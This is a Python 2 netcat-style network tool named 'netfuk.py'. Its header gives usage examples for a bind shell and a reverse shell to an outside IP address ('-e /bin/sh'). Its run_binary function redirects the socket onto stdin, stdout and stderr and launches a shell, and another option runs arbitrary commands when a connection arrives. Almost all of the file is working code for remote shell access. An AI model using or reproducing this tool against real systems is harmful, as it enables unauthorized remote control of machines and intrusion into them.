#!/usr/bin/python
#                   __    _____      __    
#      ____   _____/  |__/ ____\_ __|  | __
#     /    \_/ __ \   __\   __\  |  \  |/ /
#    |   |  \  ___/|  |  |  | |  |  /    < 
#    |___|  /\___  >__|  |__| |____/|__|_ \
#         \/     \/                      \/
#        The swiss knife for network stuff
#
# Usage examples: 
# python netfuk.py -l 4040
# python netfuk.py -l 0.0.0.0 4040 -c id
# python netfuk.py -l 127.0.0.1 4040 -e /bin/sh # bind shell
# python netfuk.py 11.22.33.44 6675
# python netfuk.py 11.22.33.44 6675 -e /bin/sh # reverse shell
# echo -ne "Supports stdin" | python netfuk.py 11.22.33.44 4455


import sys
import argparse
import subprocess
import os
import socket
import threading



target  = ""
port    = 0
listen  = False
ipv6    = False
cmd     = None
binary  = None
single  = False
verbose = False


class DevNull:
    def write(self, msg):
        pass
if not verbose:
    sys.stderr = DevNull()




def client_handler(client_sock):
    global binary
    global cmd
    if binary is not None:
        run_binary(client_sock, binary)
    if cmd is not None:
        output = run_command(cmd)
        client_sock.send(output)
    else:
        client_recv_thr=threading.Thread(target=client_recv, args=(client_sock,))
        client_recv_thr.daemon = True
        client_recv_thr.start()
        buffer=""
        client_send_thr=threading.Thread(target=client_send, args=(client_sock, buffer,))
        client_send_thr.daemon = True
        client_send_thr.start()
        while True:
            client_recv_thr.join(1)
            client_send_thr.join(1)
            if (not client_recv_thr.isAlive() and not client_send_thr.isAlive()):
                break


def client_recv(sock_target):
    while True:
        recv_len = 1
        response = ""
        try:
            while recv_len:
                data = sock_target.recv(4096)
                recv_len = len(data)
                response += data
                if recv_len < 4096:
                    break
            if single:
                break
        except KeyboardInterrupt:
            return
        except Exception, e:
            return

        sys.stdout.write(response)
        sys.stdout.flush()


def client_send(sock_target, buffer):
    try:
        if len(buffer):
            sock_target.send(buffer)
        if not single:
            while True:
                buffer = raw_input("")
                buffer += "\n"
                sock_target.send(buffer)
        else:
            sock_target.send(buffer)
    except KeyboardInterrupt:
        return
    except Exception, e:
        return


def connection_handler():
    if target == '0.0.0.0':
        log('e', 'Please specify a target (use -h for help)')
        sys.exit(-1)
    if ipv6:
        sock_target = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    else:
        sock_target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    sock_target.connect((target, port))
    log('i', 'Connected to %s:%i!' % (target, port))
    client_handler(sock_target)
    sock_target.close()


def log(status, msg):
    if verbose:
        if status is 'e': # ERROR
            sys.stdout.write("\033[91m[x] ")
        elif status is 'w': # WARNING
            sys.stdout.write("\033[93m[!] ")
        elif status is 'i': # INFO
            sys.stdout.write("\033[92m[*] ")
        elif status is 's': # SUBINFO
            sys.stdout.write("\033[95m[~] ")
        sys.stdout.write(str(msg))
        sys.stdout.write('\033[0m\n')
        sys.stdout.flush()


def main():

    global target
    global port
    global listen
    global ipv6
    global cmd
    global binary
    global single
    global verbose

    try:
        (target, port, listen, ipv6, cmd, binary, single, verbose) = parse_args()
        try:
            target=socket.gethostbyname(target)
        except Exception, e:
            log('e', "Error: Not valid ip/hostname")
            sys.exit(-1)

        if cmd is not None and binary is not None:
            log('e', "Error: Please chose either a cmd to execute or a binary, not both.")
            sys.exit(-1)

        if port < 1 or port > 65535:
            log('e', "Error: Port out of bounds. (Port must be between 0 and 65535)")
            sys.exit(-1)

        if not listen:
            connection_handler()
        else:
            server_loop()

    except Exception, e:
        if not DEBUG:
            pass


def parse_args():
    # Use -h to get the beautiful usage() of argparse
    parser = argparse.ArgumentParser(description='The swiss knife for network stuff')
    parser.add_argument('-l','--listen', action="store_true", dest="arg_listen", help="Listen mode", default=False)
    parser.add_argument('-6','--ipv6', action="store_true", dest="arg_ipv6", help="Use ipv6", default=False)
    parser.add_argument('ip', metavar="IP", type=str, help="Ip to bind/connect", nargs="?", default="0.0.0.0")
    parser.add_argument('port', metavar="PORT", type=int, action="store", help="Port to bind/connect")
    parser.add_argument('-c', action="store", dest="arg_cmd", help="Execute a command upon connection", default=None)
    parser.add_argument('-e', action="store", dest="arg_bin", help="Binary to execute upon connection", default=None)
    parser.add_argument('-s', '--single', action="store_true", dest="arg_single", help="Accept first connection, do one action then quit", default=False)
    parser.add_argument('-v', '--verbose', action="store_true", dest="arg_verbose", help="Debug yo", default=False)


    results = parser.parse_args()
    return (results.ip,results.port,results.arg_listen,results.arg_ipv6,results.arg_cmd,results.arg_bin,results.arg_single,results.arg_verbose)


def run_binary(sock,binary):
    try:
        os.dup2(sock.fileno(),0)
        os.dup2(sock.fileno(),1)
        os.dup2(sock.fileno(),2)
        subprocess.call(binary.split(), shell=True)
    except Exception, e:
        return


def run_command(cmd):
    cmd=cmd.strip()
    out = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    return out


def server_loop():
    global target
    if  target == "0.0.0.0":
        log('w', "Listening interface not set, listening on all interfaces.")
        target = "0.0.0.0"
        
    if ipv6:
        server = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    else:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((target, port))
    server.listen(5)
    log('i', "Listening on %s:%i..." % (target, port))

    if not single:
        while True:
            client_sock, addr = server.accept()
            log('s', 'New connection from %s:%i !' % (addr[0], addr[1]))
            handler_thr=threading.Thread(target=client_handler, args=(client_sock,))
            handler_thr.daemon = True
            handler_thr.start()
    else:
        client_sock, addr = server.accept()
        log('s', 'New connection from %s:%i !' % (addr[0], addr[1]))
        client_handler(client_sock)


main()
